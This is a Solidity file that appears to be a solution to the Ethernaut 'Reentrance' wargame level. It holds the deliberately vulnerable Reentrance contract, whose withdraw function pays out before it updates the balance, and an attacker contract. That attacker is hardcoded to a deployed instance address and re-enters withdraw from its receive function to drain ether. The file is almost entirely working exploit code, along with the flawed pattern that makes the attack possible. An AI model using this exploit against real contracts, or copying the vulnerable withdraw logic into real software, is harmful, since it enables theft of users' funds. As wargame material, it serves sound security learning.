// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {
  
  //using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to] + msg.value;
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
} //0x64170051843f2132d1d879fe9Dd3c68D9d8e86ec

contract ethernautReentrance {
    address payable contractAddr = payable(0x64170051843f2132d1d879fe9Dd3c68D9d8e86ec);
    //address payable me = payable(0x798349E06c67272465123B91bd88C5d19b8c7878);

    constructor() payable {}

    function solve(address reenter_) external payable {
      Reentrance enter = Reentrance(contractAddr);
      enter.donate{value: 0.001 ether}(reenter_);
      enter.withdraw(0.001 ether);
    }

    receive() external payable {
      Reentrance enter = Reentrance(contractAddr);
      enter.withdraw(0.001 ether);
    }
}